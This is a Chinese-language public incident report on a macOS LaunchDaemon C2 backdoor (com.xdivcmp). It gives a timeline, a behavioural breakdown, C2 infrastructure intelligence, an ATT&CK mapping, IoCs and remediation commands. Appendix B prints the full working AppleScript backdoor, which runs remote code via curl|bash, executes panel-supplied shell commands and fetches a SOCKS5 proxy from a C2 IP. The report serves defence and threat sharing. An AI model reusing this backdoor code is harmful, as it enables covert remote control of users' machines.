---
title: "安全事件报告(公开版):macOS 主机 C2 远控后门 IR-2026-0828-01"
description: "一份基于真实事件的应急响应/威胁情报报告:系统级 LaunchDaemon 后门 com.xdivcmp 的完整档案——样本信息卡(含 SHA-256)、逐函数行为还原、C2 基础设施情报(WHOIS/PUREVPN)、MITRE ATT&CK 映射、IoC 汇总与处置复验记录。"
pubDate: '2026-08-28 01:30:00'
tags: ["安全", "macOS", "恶意软件", "应急响应", "威胁情报", "报告", "IoC"]
---

> 本文为真实事件的**公开版安全事件报告**。完整技术拆解与防御清单见姊妹篇《[一次真实的 macOS C2 后门排查:从伪装 LaunchDaemon 到 SOCKS5 跳板](/blog/macOS-C2后门-攻击与防御/)》。内部事件报告中涉及的个人与组织信息已脱敏;样本、哈希与 IoC 完整保留(威胁情报惯例)。

# 安全事件报告:macOS 主机 C2 远控后门事件

## 报告元数据

| 字段 | 值 |
|---|---|
| 事件编号 | IR-2026-0828-01 |
| 报告日期 | 2026-08-28 |
| 事件类型 | 恶意软件投毒 —— C2 远控后门(Remote Access Backdoor) |
| 事件等级 | **中-高**(系统级持久化存在;无数据外泄、无命令执行证据;已根除) |
| 影响资产 | 本工作机(macOS 15.x,宿主用户已脱敏,企业零信任环境) |
| 感染日期(推断) | 2026-05-14 14:37 |
| 发现日期 | 2026-08-28 |
| 当前状态 | **已根除(Rooted & Verified)**,报告 Closed |
| 责任移交 | 建议移交企业 IT/安全团队(EDR 与网关侧日志复核) |

---

## 1. 事件概述(Executive Summary)

2026-08-28,在对本机进行"恶意脚本/自动上传行为"主动排查时,于 `/Library/LaunchDaemons/` 发现一枚系统级 C2 远控后门 `com.xdivcmp`。该样本为一枚 **web-panel bot 型命令执行后门**:以 launchd LaunchDaemon 持久化,通过 osascript(AppleScript)每 60 秒轮询 C2 服务器,可执行任意外部指令(`repeat`/`doshell`)、可按需下载并运行 SOCKS5 代理(`enablesocks5`),未内置文件窃取模块。

**关键结论**:

- 后门于 **2026-05-14 14:37:58** 落盘;向 C2 注册一次(botid 成功落盘,泄露用户名、macOS 版本、出口 IP);**2026-05-15 08:44:31** 写入自毁标记(`.uninstalled`),此后空转至今。
- **全部攻击性动作均未执行**(证据:`.lastaction` 从未创建;`/tmp/socks` 从未落地;无任何后门通信成功记录)。
- C2 基础设施为一次性资源:域名 5/9 注册(仅前导感染窗口 4-5 天),挂 PUREVPN IP 段。
- **投放源未在本地闭环**(详见 §10),物证指向"破解/非官方安装包 → Finder 复制 → 安装脚本(sudo)布置"形态。
- 当前:样本已全部删除并复验(§9),系统无后门残留。

---

## 2. 时间线

| 时间 (UTC+8) | 事件 |
|---|---|
| 2026-05-09 18:56 | C2 域名 `lonjfq.com` 注册(攻击准备) |
| 2026-05-14 14:37:58 | 样本落盘:`com.xdivcmp.plist` + 6 个标记文件(同分钟) |
| 2026-05-14 14:37 (同窗) | 首次运行,`joinSystem` 请求获非空响应,`botid` 落盘 |
| 2026-05-14 → 05-15 08:44 | 反复轮询 `getActions`,未获得可执行动作(或面板指令为 uninstall) |
| 2026-05-15 08:44:31 | `~/.uninstalled` 写入"+"(自毁标记),后门进入空转态 |
| 2026-08-25 15:16 前后 | 本机重启;launchd 重新加载任务,开始持续空转重启(runs 计数 14,303+) |
| 2026-08-28 00:15–01:40 | 本排查:发现样本 → 取得完整证据链 → 完成根除 |
| 2026-08-28 01:16 前后 | 清理完成并复验(launchd 无该服务、plist 与标记文件全部删除) |

---

## 3. 影响评估

| 维度 | 评估 |
|---|---|
| 数据外泄 | **一次注册请求**:用户名、macOS 版本、出口 IP;无凭据、无文件、无浏览器数据 |
| 命令执行 | **零**(`.lastaction` 缺失 + 全部动态观测无网络/无写入) |
| 持久化 | 曾存在系统级 LaunchDaemon(`RunAtLoad + KeepAlive + SessionCreate`),15 日至 28 日保持空转 |
| 权限 | 后门本体以**普通用户**运行;但落盘环节持有管理员权限(root:wheel 写入 `/Library/LaunchDaemons`) |
| 已泄露资产 | 无(凭据、密钥、文件均无泄露证据) |
| 残留风险 | 已根除 |

---

## 4. 样本分析

### 4.1 样本信息卡

| 字段 | 值 |
|---|---|
| 样本名称 | `com.xdivcmp.plist`(LaunchDaemon 配置,内嵌 C2 bot 完整脚本) |
| 样本路径 | `/Library/LaunchDaemons/com.xdivcmp.plist` |
| 样本大小 | 4,860 字节 |
| 文件类型 | XML plist(**严格解析失败**:第 17 行起含非法裸 `&`,见 §4.4) |
| 创建时间 | 2026-05-14 14:37:58 |
| 所有者/权限 | root:wheel,`-rw-r--r--`,附加 `com.apple.FinderInfo` xattr |
| **SHA-256** | `5ef1703f92516e3adc7012de3acaad8fae23c42397e973030e2dcb0209e6a791` |
| 后门凭证 | Label `com.xdivcmp`;程序标识 `app_id = "xxxblyat"` |
| 执行链 | launchd → `/bin/bash -c` → `osascript -e '<6KB AppleScript>'` |
| 运行身份 | `UserName = <用户(脱敏)>`(普通用户) |
| 样本现状 | 已于 2026-08-28 根除;完整内容见**附录 B** |

**伴生标记文件(同批,均已删除)**:

| 文件 | 大小 | 内容 | 含义 |
|---|---|---|---|
| `~/.bhost` | 22 B | `http://192.253.248.181` | bot 接口(HTTP,IP 直连) |
| `~/.phost` | 18 B | `https://lonjfq.com` | 面板地址 |
| `~/.username` | 3 B | `xxx` | 面板用户名 |
| `~/.botid` | 32 B | `29e289389d274b2d896e1fdc2e077b86` | C2 分配 bot ID(**注册成功证据**) |
| `~/.lastaction` | — | (始终不存在) | **零指令执行证据** |
| `~/.uninstalled` | 1 B | `+`(2026-05-15 08:44:31) | 自毁标记 |

### 4.2 样本结构(静态分析,逐函数)

```
launchd (RunAtLoad | KeepAlive | SessionCreate | UserName=<user>)
 └─ /bin/bash -c 'osascript -e "<AppleScript>"'
     ══ 工具函数组 ══
     · trim()          用 xargs 去除空白 —— 配置清洗
     · readFile()      整读文件,出错返回空 —— 配置读取
     · writeFile()     截断重写 —— 状态写入
     · checkActiveAppID()  pgrep -f app_id 单实例检查(⚠ 已注释禁用)
     ══ 网络函数组 ══
     · joinsystem()    GET {bhost}/api/v1/bot/joinsystem/{user}/{macOS版本}
                       响应体 = botid;失败重试 ≤10 次,每次 delay 60s
     · getActions()    GET {bhost}/api/v1/bot/actions/{botid}
                       响应须恰好 3 行 [actionID, actionName, actionComment]
                       失败重试 ≤10 次
     ══ 主逻辑 init() ══
     1. 读 ~/.uninstalled == "+" → 直接返回(自毁门闩)
     2. 缺失 .bhost/.phost/.username 任一 → 静默退出(空投模式)
     3. botid 缺失 → joinsystem 注册并落盘,delay 60
     4. 无限循环:getActions → 按 actionName 分派:
        · "uninstall"    → 写 .uninstalled=+ 退出(自愈式隐形)
        · "repeat"       → curl {bhost}/api/v1/bot/repeat/{user} | bash &
                           (带上 panel_addr 头)【RCE】
        · "doshell"      → do shell script <面板下发的命令>【RCE】
        · "enablesocks5" → 下载 {bhost}/web/socks → /tmp/socks → 后台运行
                           【SOCKS5 代理跳板】
        · 执行前先写 .lastaction = actionID ** ← 取证判据
     5. delay 60
```

### 4.3 能力判定

| 能力 | 实现 | 结论 |
|---|---|---|
| 执行任意命令 | `repeat`(curl\|bash)、`doshell` | **具备**,未触发 |
| 代理/跳板 | `enablesocks5`(下载 /tmp/socks) | **具备**,未落地 |
| 自毁/反取证 | `.uninstalled` 门闩 + 失败 10 次自杀 | 已实际生效(5/15) |
| 文件上传 | 无任何上传原语 | **不具备** |
| 凭据窃取/截屏 | 无 | 不具备 |
| 单实例防护 | 有实现但**已注释禁用** | 可多实例并发 |
| 会话保活 | KeepAlive + 重试链 + 依赖 launchd 重启 | 高度自动化 |

### 4.4 抗检测与规避设计

1. **非法 XML 混淆/隐身**:脚本内含裸 `&`,导致 `plutil`(CFPropertyList 严格解析器)**拒绝解析整个 plist**——基于 plutil 类解析器的静态提取/检测工具无法还原 payload;而 launchd 的宽松加载器可完整装载执行。**"谁能读它"与"谁能跑它"的解析器分叉是最大技术观察点**。
2. **伪装命名**:`com.xdivcmp` 仿 Apple `com.*` 常规样式混入正常自启队列。
3. **降权运行**:root 落盘、user 执行——规避高危告警面。
4. **纯脚本无编译物**:bash + osascript + curl,无 Mach-O 特征,杀软静态面极窄。
5. **状态置于磁盘**:`.bhost/.phost/.username` 等无扩展名点文件。

### 4.5 运行时行为(动态取证)

- `launchctl print system/com.xdivcmp`:任务持续加载,**runs 计数 14,303 → 14,373+ 持续增长**,`state = spawn scheduled`,`last exit code = 0`,`active count = 0`。
- 每次 spawn(约 10–35 秒节流周期)后进程存活 <1 秒即退出:与"首行 `.uninstalled` 门闩检查 → return"一致;`.uninstalled` 自 5/15 08:44:31 起从未被重写(确定该门闩持续生效)。
- 多轮高密度采样(`ps` 0.3s/1s 间隔)与 `lsof -i` 快照:**从未捕获任何后门进程的网络连接**;系统代理未开启;`/tmp/socks` 不存在。
- 结论:**5/15 之后每次执行均为零网络、零写盘的纯空转**;唯一对外通信发生在 5/14 注册窗口。

---

## 5. 攻击链与 ATT&CK 映射

```
[初始访问 T1195.002*] 破解/非官方安装包(推测,未证实)
  └─(管理员权限)→ [持久化 T1543.003] /Library/LaunchDaemons + RunAtLoad/KeepAlive/SessionCreate
       ├─ [执行 T1059.002] osascript(AppleScript)
       ├─ [执行 T1059.004] /bin/bash -c curl|bash(由面板指令触发)
       ├─ [C2 T1071.001] HTTP GET /api/v1/bot/*(User-Agent: bot,无鉴权)
       ├─ [代理 T1090.003] enablesocks5 → /tmp/socks(可触发)
       └─ [防御规避 T1036/T1562.*] 仿名 label、非法 XML、降权、磁盘状态自门闩
```

| MITRE ATT&CK | 技术 | 样本证据 |
|---|---|---|
| T1195.002(Tool Supply Chain)* | 初始访问 | 物证推断(§10.2),未证实 |
| T1543.003 | 系统服务持久化(LaunchDaemon) | plist 字段 |
| T1059.002 | AppleScript 执行 | osascript 主逻辑 |
| T1059.004 | Unix Shell 执行 | bash -c + curl\|bash |
| T1071.001 | HTTP C2 | 全部通信走 HTTP GET |
| T1105 | 工具下载(Inbound) | /web/socks → /tmp/socks |
| T1090.003 | 代理(外部转发) | socks5 启动原语 |
| T1036.005 | 合法名称伪装 | com.xdivcmp、xxxblyat |
| 自我清理 | 自毁门闩 | .uninstalled 机制 |

\* 未证实项均已在文中标注。

---

## 6. C2 基础设施分析

| 对象 | 情报 | 判定 |
|---|---|---|
| 域名 `lonjfq.com` | 注册 2026-05-09(注册商 **PDR Ltd. / PublicDomainRegistry**,NS **Cloudflare**),注册人假名 "Hudson Russell" | 一次性 C2 域名,生命周期与感染窗重合 |
| IP `192.253.248.181` | 归属 **PUREVPN / Secure Internet LLC(US)** | 匿名化 VPN 基础设施 |
| 接口路径 | `/{bot,web}/api/v1/bot/{joinsystem,actions,repeat}` | web-panel bot 协议 |
| 身份认证 | **无**;仅 `User-Agent: bot` 头 | 面板 API 可被任意访问者操作 |
| 解析链路 | 本机经企业隧道 DNS 解析为 `198.0.12.59`(PTR 反解 192.253.248.181 → 198.0.12.60) | 与企业零信任虚拟网段一致,实际出口经企业网关(网关日志是回溯关键) |
| 运营节奏 | 注册(5/9)→ 投递(5/14)→ 自毁(5/15),全程 6 天 | 短生命周期 + 主动回收 |

### 6.1 外部威胁情报交叉验证

| 来源 | 内容 | 证据等级 |
|---|---|---|
| 开源分析平台 SafeMode("86.54.25.204 恶意页面分析",2026-05-11) | `lonjfq.com` 出现在 86.54.25.204 的 **Similar Websites** 列表,同列 `86.54.25.202`、`77.110.124.112` | **关联性证据**(特征聚类),非 DNS 历史解析证明、非同一运营者证明 |
| 本地核验(whois / 隧道解析) | 86.54.25.202/204 = `Shereverov-network`(KZ);77.110.124.112 = `Netcrafters-OU`(EE/US);经隧道分别映射 198.0.12.169/.170/.171,与本事件 C2 的 .59/.60 **同一虚拟网段且地址相邻** | 支持"同一家族基础设施",不足以断言同一运营者 |

**处理口径**:SafeMode 关联不作实锤,仅用于扩展 IoC 挖掘方向(小型 VPN/VPS 段 + 短寿命域名 + 假名注册人组合特征);已建议企业侧网关日志按该口径回溯。另:未检索到针对该 bot 面板家族的公开专项报告,公开覆盖稀缺,本报告为当前最完整记录。

---

## 7. IoC 汇总

### 7.1 文件型 IoC

| 类型 | 路径 | 说明 |
|---|---|---|
| 恶意 plist | `/Library/LaunchDaemons/com.xdivcmp.plist` | sha256 `5ef1703f...e6a791`(附录 C) |
| 标记文件 | `~/.bhost` `.phost` `.username` `.botid` `.lastaction` `.uninstalled` | 内容见 §4.1 |
| 下载目标 | `/tmp/socks` | 未落地 |

### 7.2 网络型 IoC

| 类型 | 值 |
|---|---|
| 域 | `lonjfq.com` |
| IP | `192.253.248.181:80`(bhost)、`198.0.12.59`(隧道内解析) |
| URL | `http://192.253.248.181/api/v1/bot/joinsystem/{user}/{macosver}` |
| URL | `http://192.253.248.181/api/v1/bot/actions/{botid}` |
| URL | `http://192.253.248.181/api/v1/bot/repeat/{user}` |
| URL | `http://192.253.248.181/web/socks` |
| 标识 | `User-Agent: bot`;`app_id=xxxblyat`;label `com.xdivcmp` |

### 7.3 行为型 IoC(IOA)

- launchd 任务以 `bash -c` + **内联 osascript 大段脚本**为 payload
- 主目录顶层新增点文件(`.bhost/.phost/.username/.botid/.lastaction/.uninstalled`)
- `osascript` 与 `curl` 组合;`curl ... | bash`
- `/Library/LaunchDaemons` 新 plist 携带 `KeepAlive+RunAtLoad+SessionCreate` 且为纯脚本构成

---

## 8. 检测与取证方法

| 步骤 | 工具/手法 | 结论 |
|---|---|---|
| 进程与网络快照 | `ps -axo pid,ppid,user,etime,args`、`lsof -nP -i`、`netstat` | 无异常活动 |
| 持久化面普查 | `ls /Library/LaunchDaemons` + 逐条审读 | **命中 xdivcmp** |
| 样本还原 | 原文 + `launchctl print system/com.xdivcmp`(运行态参数核对,逐字一致) | 完整 6KB 样本 |
| 行为证据链 | `.lastaction` 缺失、`/tmp/socks` 缺失、`.uninstalled` mtime 恒定 | 零动作执行 |
| 基础设施情报 | `whois`(域名/IP)、`dig`(解析链路) | PUREVPN 段、5/9 注册 |
| 投放源排查 | 18 个存储源(§10) | 客户端全部被保留期覆盖 |
| 调度状态观测 | `launchctl print` 计数采样、高密度 ps 采样 | 空转循环实锤 |

---

## 9. 响应处置(围堵/根除/复验)

| 阶段 | 动作 | 时间 |
|---|---|---|
| 确认 | 识别并冻结分析(未删除证据前禁止动 `.uninstalled`) | 08-28 00:35–01:00 |
| 围堵 | 无活跃网络会话,无需网络隔离(企业隧道内) | — |
| 根除 | `launchctl bootout`(报 error 3=先前 remove 已生效,符合预期)→ `launchctl remove` → `rm -f plist` → `rm -f` 6 个标记文件(顺序:先 plist 后标记,防"被门闩解除后重新武装") | 01:05 前后 |
| 复验 | 见下矩阵 | 01:16 前后 |

**复验矩阵(全绿)**:

| 检查项 | 结果 |
|---|---|
| `launchctl list` 不含 xdivcmp;`launchctl print system/com.xdivcmp` → Could not find service | ✅ |
| `/Library/LaunchDaemons/com.xdivcmp.plist` 不存在 | ✅ |
| 6 个标记文件全部不存在 | ✅ |
| `~/Library/LaunchAgents`、`/Library/LaunchAgents` 无副本 | ✅ |

---

## 10. 根因与投放源(未闭环部分)

### 10.1 排查矩阵(结论:客户端证据全部过期)

| 记录源 | 保留期 | 结果 |
|---|---|---|
| Chrome 历史(两 profile) | ~90 天 | 5/14 已裁剪 |
| macOS 隔离库(QuarantineEventsV2,现为 SQLite) | 近 21 条 | 仅 8 月记录 |
| unified log / install.log | 数周/8-20 起 | 不可查 |
| 聊天软件容器(微信/QQ/钉钉/飞书/企业微信) | — | 5/11–17 无文件传输;唯一 DMG 为 5/20 |
| shell 历史(无时间戳)、回收站(空)、TM 快照(无)、pkg 收据(无)、/Applications(无 5 月安装) | — | 无痕 |

### 10.2 物证推断

- 6 个标记文件 + plist **均带 `com.apple.FinderInfo` 且均无 `com.apple.quarantine`** ⇒ 文件非浏览器直接下载,而是经 Finder 复制流程取自**已挂载介质(DMG/USB/共享盘)**;plist 为 root:wheel ⇒ 安装环节持管理员权限。
- 形态判定:破解/非官方安装包 → Finder 取件 → 安装脚本(sudo)布置 → 系统级 LaunchDaemon + 预置配置(botid 预生成)。

### 10.3 环境线索

- 本机长期存在破解工具使用行为(adhoc 签名工具,8/20 仍从破解聚合站下载同家族安装包)——与 5/14 投毒形态最吻合的假设,但**无直接证据**。

---

## 11. 修复与加固建议

1. **企业侧(唯一可能存活证据)**:Sangfor 隧道网关 5/14 14:35–14:40 访问记录、360EPP 管理端 5/14–15 告警、出口 DNS/HTTP 日志;顺带用 §7 IoC 查全网段同源命中。
2. **主机卫生**:移除破解工具箱及注入的 `-javaagent` 行(备份另存)。
3. **软件治理**:破解/激活类工具禁止在办公机与内网使用;如确需,仅限无业务数据的隔离虚拟机。
4. **监控规则**:`osascript`+`curl`/`wget` 组合、`/Library/LaunchDaemons` 新增文件、主目录顶层新增点文件、`KeepAlive+RunAtLoad+SessionCreate` 异常组合。
5. **凭据**:本次未泄露口令,但"用户名+版本+IP"已被 C2 知悉;重点账号建议轮换。
6. **备份**:启用 Time Machine 或企业备份,保留快照时间窗样本(本次因无快照,历史取证受限)。

---

## 12. 结论

本事件为一起**一次性基础设施、短生命周期、主动回收**的 C2 远控后门投毒事件:成功实现系统级持久化与注册,但未进入指令执行阶段即被(或自行)关闭。除一次注册信息外**无任何数据外泄、无命令执行、无代理落地**。本地证据链完整(含样本全文与哈希),根除彻底。投放源未能本地闭环,移交企业侧处理。

---

## 附录 A:排查命令速查

```bash
# 检测
ps -axo pid,ppid,user,etime,args
lsof -nP -i
ls -la /Library/LaunchDaemons /Library/LaunchAgents ~/Library/LaunchAgents
launchctl print system/com.xdivcmp        # 任务状态/runs/参数
stat /var/tmp; find /var/tmp -newermt ... # 跨重启残留
sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
  "select * from LSQuarantineEvent"        # 隔离库(SQLite)
# 清理(先 plist 后标记)
sudo launchctl bootout system/com.xdivcmp; sudo launchctl remove com.xdivcmp
sudo rm -f /Library/LaunchDaemons/com.xdivcmp.plist
rm -f ~/.bhost ~/.botid ~/.phost ~/.username ~/.lastaction ~/.uninstalled
# 复验
launchctl list | grep -i xdivcmp || echo CLEAN
```

## 附录 B:木马样本全文(原始 AppleScript,与 launchd 运行态参数逐字一致)

> 样本来源:`/Library/LaunchDaemons/com.xdivcmp.plist` 中 `ProgramArguments[2]`(2026-05-14 14:37 落盘,sha256 `5ef1703f...`)。

```
osascript -e 'set app_id to "xxxblyat"
on trim(theText)
	set rettext to ""
	try
		set rettext to (do shell script "echo \"" & theText & "\" | xargs")
	end try
	return rettext
end trim
on readFile(pathToFile)
	try
		set fileContent to read pathToFile
		return fileContent
	end try
	return ""
end readFile
on writeFile(pathToFile, textToWrite)
	try
		set fileRef to (open for access pathToFile with write permission)
		set eof of fileRef to 0
		write textToWrite to fileRef starting at eof
		close access fileRef
	end try
end writeFile
on checkActiveAppID(app_id)
	try
		set idOut to do shell script "pgrep -f " & quoted form of app_id
		if idOut is not equal to "" then
			return true
		end if
	end try
	return false
end checkActiveAppID

on joinsystem(botHost, panelUsername, macOSVers, attempt)
	if attempt > 10 then
		return "not"
	end if
	try
		set joinSystemURL to botHost & "/api/v1/bot/joinsystem/" & panelUsername & "/" & macOSVers
		set botID to do shell script "curl -H \"User-Agent: bot\" -s " & quoted form of joinSystemURL
		if botID is equal to "" then
			return "not"
		end if
		return botID
	on error ErrMsg
		delay 60
		return joinsystem(botHost, panelUsername, attempt + 1)
	end try
	return "not"
end joinsystem

on getActions(botHost, botID, attempt)
	if attempt > 10 then
		return "not"
	end if
	try
		set actionsURL to botHost & "/api/v1/bot/actions/" & botID
		set resultSend to do shell script "curl -H \"User-Agent: bot\" -s " & quoted form of actionsURL
		set output to paragraphs of resultSend
		if (length of output) is not equal to 3 then
			delay 60
			return getActions(botHost, botID, attempt + 1)
		end if
		return output
	on error
		delay 60
		return getActions(botHost, botID, attempt + 1)
	end try
	return "not"
end getActions

on uninstall(profile)
	writeFile(profile & "/.uninstalled", "+")
	do shell script "exit 0"
end uninstall

on init(app_id)
	--if checkActiveAppID(app_id) then
	--	return
	--end if


	set mac_username to (system attribute "USER")
	set profile to "/Users/" & mac_username

	if readFile(profile & "/.uninstalled") is equal to "+" then
		return
	end if

	set lastActionPath to profile & "/.lastaction"
	set botidPath to profile & "/.botid"
	set bHostPath to profile & "/.bhost"
	set pHostPath to profile & "/.phost"
	set panelUsernamePath to profile & "/.username"

	set panelAddr to readFile(pHostPath)
	if panelAddr is equal to "" then
		return
	end if

	set panelAddr to trim(panelAddr)

	set botHost to readFile(bHostPath)
	if botHost is equal to "" then
		return
	end if

	set botHost to trim(botHost)

	set panelUsername to readFile(panelUsernamePath)
	if panelUsername is equal to "" then
		return
	end if

	set panelUsername to trim(panelUsername)

	set botID to readFile(botidPath)
	set botID to trim(botID)
	if botID is equal to "" then
		set macOSVers to do shell script "sw_vers -productVersion"
		set botID to joinsystem(botHost, panelUsername, macOSVers, 1)
		if botID is equal to "not" then
			uninstall(profile)
			return
		end if

		writeFile(botidPath, botID)
		delay 60
	end if

	repeat
		set lastAction to readFile(lastActionPath)
		set botActionList to getActions(botHost, botID, 1)
		if botActionList is equal to "not" then
			uninstall(profile)
			return
		end if

		set actionID to item 1 of botActionList
		set actionName to item 2 of botActionList
		set actionComment to item 3 of botActionList

		if actionName is equal to "uninstall" then
			uninstall(profile)
			return
		end if


		if actionID is not equal to lastAction then
			set lastAction to actionID
			writeFile(lastActionPath, lastAction)

			if actionName is equal to "repeat" then
				try
					set repeatUrl to botHost & "/api/v1/bot/repeat/" & panelUsername
					do shell script "curl -H \"User-Agent: bot\" -H \"panel_addr: " & panelAddr & "\" -s " & quoted form of repeatUrl & " | bash &"
				end try
			end if

			if actionName is equal to "doshell" then
				try
					do shell script actionComment
				end try
			end if

			if actionName is equal to "enablesocks5" then
				try
					set socksUrl to botHost & "/web/socks"
					do shell script "curl -o /tmp/socks " & quoted form of socksUrl
					do shell script "chmod +x /tmp/socks"
					do shell script "/tmp/socks > /dev/null 2>&1 & disown"
				end try
			end if
		end if
		delay 60
	end repeat
end init

init(app_id)
'
```

## 附录 C:IoC 哈希与身份

| 对象 | SHA-256 / ID |
|---|---|
| `com.xdivcmp.plist` | `5ef1703f92516e3adc7012de3acaad8fae23c42397e973030e2dcb0209e6a791` |
| bot 标识 | `xxxblyat` |
| botid(本机) | `29e289389d274b2d896e1fdc2e077b86` |
| launchd label | `com.xdivcmp` |

---

*报告完(IR-2026-0828-01,Closed;根除与复验日期 2026-08-28;公开版脱敏整理)*
